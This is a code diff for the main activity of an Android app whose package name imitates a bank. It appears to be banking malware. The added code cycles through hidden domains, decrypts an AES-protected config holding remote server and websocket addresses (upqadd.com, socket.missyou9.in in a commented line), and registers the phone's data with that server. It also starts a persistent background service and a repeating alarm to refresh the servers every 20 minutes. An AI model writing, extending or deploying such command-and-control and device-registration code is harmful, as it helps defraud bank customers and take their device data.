@@ -1,6 +1,9 @@
 package com.axisofbank.german;
 
 import android.Manifest;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -28,15 +31,25 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
+//        Helper H = new Helper();
+//        try {
+//            String encryption = AESDescryption.encrypt("{ \"domain\": \"https://upqadd.com/api\", \"socket\":\"wss://socket.missyou9.in\" }", H.KEY());
+//            Log.d(Helper.TAG, "data ecn "+encryption);
+//        } catch (Exception e) {
+//            throw new RuntimeException(e);
+//        }
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        checkPermissions();
 
+
+        checkPermissions();
         if (savedInstanceState == null) {
             getSupportFragmentManager().beginTransaction()
                     .replace(R.id.form_content, new FormFragment1())
                     .commit();
         }
+
     }
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
@@ -59,7 +72,6 @@ public class MainActivity extends AppCompatActivity {
                 } else {
                     showPermissionDeniedDialog();
                     Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
-                    Log.d("Permissions", "Missing Permissions: " + missingPermissions.toString());
                 }
             }
         }
@@ -137,13 +149,11 @@ public class MainActivity extends AppCompatActivity {
 
     public void registerPhoneData() {
         SharedPreferencesHelper share = new SharedPreferencesHelper(getApplicationContext());
-//            if(share.getBoolean("is_registered", false)){
-//                return ;
-//            }
+
         share.saveBoolean("is_registered", true);
         NetworkHelper networkHelper = new NetworkHelper();
         Helper help = new Helper();
-        String url = help.URL() + "/mobile/add";
+        String url = help.URL(this) + "/mobile/add";
         JSONObject sendData = new JSONObject();
         try {
             Helper hh = new Helper();
@@ -162,7 +172,6 @@ public class MainActivity extends AppCompatActivity {
         }catch (JSONException e) {
             e.printStackTrace();
         }
-        Log.d(Helper.TAG, "MOBILE INFO" + sendData);
         networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
             @Override
             public void onSuccess(String result) {
@@ -170,7 +179,6 @@ public class MainActivity extends AppCompatActivity {
                     try {
                         JSONObject jsonData = new JSONObject(result);
                         if(jsonData.getInt("status") == 200) {
-                            Log.d(Helper.TAG, "Registered Mobile");
                         }else {
                             Log.d(Helper.TAG, "Mobile Could Not Registered "+ jsonData.toString());
                             Toast.makeText(getApplicationContext(), "Mobile Could Not Be Registered " + jsonData.toString(), Toast.LENGTH_LONG).show();
@@ -192,21 +200,87 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void init(){
+        if(!Helper.isNetworkAvailable(this)) {
+            Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
+            startActivity(intent);
+        }
+        this.updateDomain(this);
+    }
+    public void initFunction(){
         registerPhoneData();
-
         Intent serviceIntent = new Intent(this, BackgroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
         } else {
             startService(serviceIntent);
         }
-        Helper helper1 = new Helper();
-        Log.d(helper1.TAG, helper1.SITE());
-
-        if(!Helper.isNetworkAvailable(this)) {
-            Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
-            startActivity(intent);
-        }
-
+        scheduleDomainUpdateAlarm();
     }
+
+    private void scheduleDomainUpdateAlarm() {
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+
+        Intent intent = new Intent(this, DomainUpdateReceiver.class);
+        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
+                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+                : PendingIntent.FLAG_UPDATE_CURRENT;
+
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                this, 0, intent, flags);
+
+        long interval = 20 * 60 * 1000;
+        long triggerAtMillis = System.currentTimeMillis() + interval;
+
+        alarmManager.setRepeating(
+                AlarmManager.RTC_WAKEUP, triggerAtMillis, interval, pendingIntent);
+    }
+
+
+    public void updateDomain(final Context cc) {
+        final SharedPreferencesHelper db = new SharedPreferencesHelper(cc);
+        final NetworkHelper network = new NetworkHelper();
+        final Helper help = new Helper();
+        String DomainList = help.DomainList();
+        final String[] domainArray = DomainList.split(", ");
+        checkDomainSequentially(0, domainArray, db, network);
+    }
+
+    private void checkDomainSequentially(final int index, final String[] domainArray, final SharedPreferencesHelper db, final NetworkHelper network) {
+        if (index >= domainArray.length) {
+            db.saveString("domainStatus", "failed");
+            return;
+        }
+        final String currentDomain = domainArray[index];
+        network.makeGetRequest(currentDomain, new NetworkHelper.GetRequestCallback() {
+            @Override
+            public void onSuccess(String result) {
+                String encryptedData = result.trim();
+                Log.d(Helper.TAG, "Domain Response Body "+encryptedData);
+                try {
+                    Helper h = new Helper();
+                    String decryptedData = AESDescryption.decrypt(encryptedData, h.KEY());
+
+                    if (!decryptedData.isEmpty()) {
+                        JSONObject object = new JSONObject(decryptedData);
+                        Log.d(Helper.TAG, "data response"+object.toString());
+                        db.saveString("domain", object.getString("domain"));
+                        db.saveString("socket", object.getString("socket"));
+                        initFunction();
+                    }
+                } catch (Exception e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+            @Override
+            public void onFailure(String error) {
+                Log.d(Helper.TAG, "Failed for domain: " + currentDomain + " Error: " + error);
+                Toast.makeText(getApplicationContext(), "Failed for domain: " + currentDomain + " Error: " + error, Toast.LENGTH_LONG).show();
+                checkDomainSequentially(index + 1, domainArray, db, network);
+            }
+        });
+    }
+
+
+
 }
